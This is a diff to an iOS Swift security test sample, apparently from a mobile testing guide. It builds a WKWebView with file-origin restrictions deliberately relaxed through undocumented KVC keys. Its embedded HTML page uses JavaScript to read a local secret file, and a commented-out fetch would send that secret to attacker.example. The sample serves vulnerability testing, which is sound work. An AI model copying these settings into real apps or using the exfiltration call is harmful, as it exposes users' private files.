@@ -1,36 +1,107 @@
 import UIKit
 import WebKit
 
-// SUMMARY: This sample demonstrates a WKWebView configured to allow file access from file URLs, which could enable malicious JavaScript to access local files.
+struct MastgTest {
 
-class MastgTest {
+    private static let docDir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
+    private static let indexURL = docDir.appendingPathComponent("index.html")
+    private static let secretURL = docDir.appendingPathComponent("secret.txt")
 
-    static func mastgTest(completion: @escaping (String) -> Void) {
-        var webView: WKWebView!
+    public static func mastgTest(completion: @escaping (String) -> Void) {
+        createSecretFile()
+        createHtmlFile()
 
-        // FAIL: [MASTG-TEST-0318] Configure WKWebView with file access enabled
+        DispatchQueue.main.async {
+            showWebView(completion: completion)
+        }
+    }
+
+    private static func showWebView(completion: @escaping (String) -> Void) {
         let configuration = WKWebViewConfiguration()
-        
-        // Enable JavaScript
-        configuration.preferences.javaScriptEnabled = true
-        
-        // FAIL: [MASTG-TEST-0318] Set undocumented properties to allow file access
-        // These properties are not officially documented and must be set via KVC
+
+        // Unsupported or non public configuration paths on iOS.
         configuration.preferences.setValue(true, forKey: "allowFileAccessFromFileURLs")
         configuration.setValue(true, forKey: "allowUniversalAccessFromFileURLs")
-        
-        // Create WebView with the configuration
-        webView = WKWebView(frame: .zero, configuration: configuration)
-        
-        // FAIL: [MASTG-TEST-0318] Load a local HTML file
-        // In a real attack scenario, this HTML file could contain malicious JavaScript
-        if let htmlPath = Bundle.main.url(forResource: "index", withExtension: "html") {
-            // FAIL: [MASTG-TEST-0318] Grant read access to the directory containing the HTML file
-            // This allows the WebView to access all files in that directory
-            let readAccessURL = htmlPath.deletingLastPathComponent()
-            webView.loadFileURL(htmlPath, allowingReadAccessTo: readAccessURL)
+
+        let webView = WKWebView(frame: .zero, configuration: configuration)
+
+        let vc = UIViewController()
+        vc.view = webView
+
+        guard let presenter = topViewController() else {
+            completion("Failed to present, no view controller.")
+            return
         }
-        
-        completion("WebView configured with file access enabled")
+
+        presenter.present(vc, animated: true) {
+            completion("Loading local file with relaxed file origin policies enabled.")
+            webView.loadFileURL(indexURL, allowingReadAccessTo: docDir)
+        }
+    }
+
+    private static func createHtmlFile() {
+        let htmlContent = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Local File Access Demo</title>
+        </head>
+        <body>
+            <h1>Local File Access Demo</h1>
+            <p>This page attempts to read another local file using JavaScript.</p>
+
+            <p><b>Result:</b></p>
+            <pre id="result">Loading...</pre>
+
+            <script>
+            async function readLocalSecret() {
+                try {
+                    const response = await fetch("./secret.txt");
+                    const text = await response.text();
+                    document.getElementById("result").textContent = text;
+
+                    // Optional exfiltration demonstration for controlled testing only.
+                    // This requires allowUniversalAccessFromFileURLs and a test server.
+                    //
+                    // await fetch("https://attacker.example/collect?data=" + encodeURIComponent(text), {
+                    //     method: "GET",
+                    //     mode: "cors"
+                    // });
+
+                } catch (error) {
+                    document.getElementById("result").textContent =
+                        "Failed to read local file: " + error;
+                }
+            }
+
+            readLocalSecret();
+            </script>
+        </body>
+        </html>
+        """
+        try? htmlContent.write(to: indexURL, atomically: true, encoding: .utf8)
+    }
+
+    private static func createSecretFile() {
+        try? "MY SECRET".write(to: secretURL, atomically: true, encoding: .utf8)
+    }
+
+    private static func topViewController(base: UIViewController? = nil) -> UIViewController? {
+        let root = base ?? UIApplication.shared.connectedScenes
+            .compactMap { $0 as? UIWindowScene }
+            .flatMap { $0.windows }
+            .first { $0.isKeyWindow }?.rootViewController
+
+        if let nav = root as? UINavigationController {
+            return topViewController(base: nav.visibleViewController)
+        }
+        if let tab = root as? UITabBarController {
+            return topViewController(base: tab.selectedViewController)
+        }
+        if let presented = root?.presentedViewController {
+            return topViewController(base: presented)
+        }
+        return root
     }
 }
